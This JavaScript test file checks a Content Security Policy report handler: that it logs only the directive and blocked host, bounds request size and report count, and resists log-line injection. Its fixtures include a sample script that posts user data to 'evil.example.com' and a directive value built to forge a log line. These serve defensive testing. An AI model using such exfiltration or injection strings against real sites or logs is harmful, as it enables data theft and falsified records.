import assert from "node:assert/strict";
import test from "node:test";
import { MAX_REPORT_BYTES, blockedHost, brokenDirective, handleCspReport, violations } from "../csp.mjs";

// Sends a report to the handler and returns its response and what it logged.
async function report(body, { method = "POST", type = "application/csp-report" } = {}) {
  const lines = [];
  const saved = { error: console.error, log: console.log, warn: console.warn, info: console.info };
  for (const name of Object.keys(saved)) console[name] = (...args) => lines.push(args.map(String).join(" "));
  try {
    const response = await handleCspReport(new Request("https://baseline.test/api/csp-report", {
      method, headers: { "Content-Type": type }, body: method === "POST" ? (typeof body === "string" ? body : JSON.stringify(body)) : undefined
    }));
    return { response, lines };
  } finally {
    Object.assign(console, saved);
  }
}

test("a report-uri report logs only the directive and the blocked host", async () => {
  const { response, lines } = await report({ "csp-report": {
    "document-uri": "https://baseline.example/#your-data", referrer: "https://mail.example/inbox/user@example.com",
    "violated-directive": "script-src-elem", "effective-directive": "script-src-elem", "original-policy": "default-src 'self'",
    "blocked-uri": "https://evil.example.com/steal.js?user=user_2abc&weight=80", "source-file": "https://baseline.example/app.mjs",
    "script-sample": "fetch('https://evil.example.com', { body: weights })", disposition: "report", "status-code": 200
  } });
  assert.equal(response.status, 204);
  assert.deepEqual(lines, ["CSP violation: script-src-elem blocked evil.example.com"]);
});

test("a Reporting API report is read too, and other kinds of report are ignored", async () => {
  const { response, lines } = await report([
    { type: "csp-violation", url: "https://baseline.example/", body: { effectiveDirective: "connect-src", blockedURL: "https://clerk-telemetry.com/v1/event", documentURL: "https://baseline.example/" } },
    { type: "deprecation", body: { id: "x", message: "user_1" } },
    { type: "csp-violation", body: { effectiveDirective: "img-src", blockedURL: "data" } }
  ], { type: "application/reports+json" });
  assert.equal(response.status, 204);
  assert.deepEqual(lines, ["CSP violation: connect-src blocked clerk-telemetry.com", "CSP violation: img-src blocked data"]);
});

test("the blocked host is a host, a keyword or a scheme, never a path or query", () => {
  assert.equal(blockedHost("https://img.example.com:8443/a/b?c=d#e"), "img.example.com:8443");
  assert.equal(blockedHost("wss://socket.example.com/x"), "socket.example.com");
  assert.equal(blockedHost("inline"), "inline");
  assert.equal(blockedHost("EVAL"), "eval");
  assert.equal(blockedHost("data:image/png;base64,AAAA"), "data");
  assert.equal(blockedHost("blob:https://baseline.example/1234"), "blob");
  assert.equal(blockedHost("chrome-extension://abcdefghijklmnop/inject.js"), "chrome-extension");
  for (const value of ["", "user_2abc weighs 80 kg", null, 42, { host: "x" }]) assert.equal(blockedHost(value), "unknown", String(value));
});

test("the directive is one word, and anything else is unknown", () => {
  assert.equal(brokenDirective({ "violated-directive": "script-src 'self' https://x.example" }), "script-src", "older browsers send the whole directive");
  assert.equal(brokenDirective({ effectiveDirective: "Frame-Ancestors" }), "frame-ancestors");
  assert.equal(brokenDirective({ "effective-directive": "\nCSP violation: fake line" }), "csp", "a line break can't start a log line of its own");
  assert.equal(brokenDirective({ "effective-directive": "<script>" }), "unknown");
  assert.equal(brokenDirective({}), "unknown");
});

test("only POST is accepted, bodies are bounded, and junk logs nothing", async () => {
  assert.equal((await report(null, { method: "GET" })).response.status, 405);
  const junk = await report("{not json");
  assert.equal(junk.response.status, 204);
  assert.deepEqual(junk.lines, []);
  const big = await report({ "csp-report": { "effective-directive": "img-src", "blocked-uri": "https://x.example/" + "a".repeat(MAX_REPORT_BYTES) } });
  assert.deepEqual(big.lines, []);
  const many = Array.from({ length: 50 }, () => ({ type: "csp-violation", body: { effectiveDirective: "img-src", blockedURL: "https://x.example/" } }));
  assert.equal(violations(JSON.stringify(many)).length, 10);
});
